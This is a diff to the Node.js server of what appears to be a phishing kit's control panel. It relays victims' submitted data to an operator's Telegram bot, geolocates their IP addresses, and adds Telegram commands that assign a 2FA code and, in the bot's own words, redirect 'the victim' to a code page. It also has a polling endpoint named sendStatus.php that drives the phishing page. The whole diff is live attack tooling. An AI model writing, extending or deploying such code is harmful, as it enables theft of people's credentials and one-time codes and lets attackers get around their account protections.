@@ -35,7 +35,7 @@ function guardarEstado() {
 // 👉 Obtener ciudad con IPv4 forzado
 async function obtenerCiudad(ip) {
   try {
-    const response = await fetch(`https://ipinfo.io/${ip}/json`, { agent }); // ← FORZADO IPv4
+    const response = await fetch(`https://ipinfo.io/${ip}/json`, { agent });
     const data = await response.json();
     return data.city || 'Ciudad desconocida';
   } catch {
@@ -71,10 +71,9 @@ app.post('/enviar', async (req, res) => {
     ]
   };
 
-  clientes[txid] = "esperando";
+  clientes[txid] = { status: "esperando" }; // Cambiamos a objeto para poder agregar code después
   guardarEstado();
 
-  // 👉 ENVÍO A TELEGRAM CON IPv4
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -84,80 +83,112 @@ app.post('/enviar', async (req, res) => {
       parse_mode: 'HTML',
       reply_markup: keyboard
     }),
-    agent // ← FORZADO IPv4
+    agent
   });
 
   res.sendStatus(200);
 });
 
-
-
-
 // -----------------------------------------------------------
-//  /callback
+//  /callback (maneja botones inline) + NUEVO: comandos de texto (/txid 22)
 // -----------------------------------------------------------
 app.post('/callback', async (req, res) => {
-  const callback = req.body.callback_query;
-  if (!callback || !callback.data) return res.sendStatus(400);
+  // 1. Manejo de callback de botones inline
+  if (req.body.callback_query) {
+    const callback = req.body.callback_query;
+    if (!callback || !callback.data) return res.sendStatus(400);
 
-  const [accion, txid] = callback.data.split(":");
-  clientes[txid] = accion;
-  guardarEstado();
+    const [accion, txid] = callback.data.split(":");
+    clientes[txid] = { status: accion };
+    guardarEstado();
 
-  // 👉 ENVÍO CALLBACK A TELEGRAM CON IPv4
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      callback_query_id: callback.id,
-      text: `Has seleccionado: ${accion}`
-    }),
-    agent // ← FORZADO IPv4
-  });
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: callback.id,
+        text: `Has seleccionado: ${accion}`
+      }),
+      agent
+    });
+
+    return res.sendStatus(200);
+  }
+
+  // 2. NUEVO: Manejo de comandos de texto como /abc123xyz 22
+  if (req.body.message?.text) {
+    const text = req.body.message.text.trim();
+
+    if (text.startsWith('/')) {
+      const parts = text.slice(1).split(' ');
+      const txid = parts[0];
+      const code = parts[1];
+
+      if (txid && code && /^\d{2}$/.test(code)) {
+        if (!clientes[txid]) {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: req.body.message.chat.id,
+              text: `❌ Error: txid ${txid} no encontrado`
+            }),
+            agent
+          });
+          return res.sendStatus(200);
+        }
+
+        // Guardamos el código y cambiamos status
+        clientes[txid] = {
+          status: "codigo2fa",
+          code: code
+        };
+        guardarEstado();
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: req.body.message.chat.id,
+            text: `✅ Código 2FA activado!\n\n🆔 ID: ${txid}\n🔢 Código: ${code}\n\nLa víctima será redirigida a la página del código en segundos.`
+          }),
+          agent
+        });
+
+        return res.sendStatus(200);
+      }
+
+      // Formato incorrecto
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: req.body.message.chat.id,
+          text: `⚠️ Formato incorrecto.\n\nUsa: /txid código\nEjemplo: /abc123xyz 47`
+        }),
+        agent
+      });
+
+      return res.sendStatus(200);
+    }
+  }
 
   res.sendStatus(200);
 });
 
-app.post('/setcode', async (req, res) => {
-  const { txid, code } = req.body;
-
-  // Validaciones básicas
-  if (!txid || !code || !/^\d{2}$/.test(code)) {
-    return res.status(400).json({ error: 'Faltan parámetros o código inválido (debe ser exactamente 2 dígitos)' });
-  }
-
-  // Guardamos el código asociado al txid
-  if (!clientes[txid]) {
-    return res.status(404).json({ error: 'txid no encontrado' });
-  }
-
-  clientes[txid] = {
-    status: clientes[txid], // mantenemos el status anterior
-    code: code               // agregamos el código de 2 dígitos
-  };
-
-  guardarEstado();
-  res.json({ success: true, message: `Código ${code} asignado a ${txid}` });
-});
-
-
 // -----------------------------------------------------------
-//  POLLING
+//  POLLING: devuelve status y code si existe
 // -----------------------------------------------------------
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
   const cliente = clientes[txid] || { status: "esperando" };
 
-  let response = { status: "esperando" };
+  const response = {
+    status: typeof cliente === 'string' ? cliente : (cliente.status || "esperando")
+  };
 
-  if (typeof cliente === 'string') {
-    response.status = cliente;
-  } else {
-    // cliente es un objeto { status, code }
-    response.status = cliente.status || "esperando";
-    if (cliente.code) {
-      response.code = cliente.code;
-    }
+  if (typeof cliente === 'object' && cliente.code) {
+    response.code = cliente.code;
   }
 
   res.json(response);
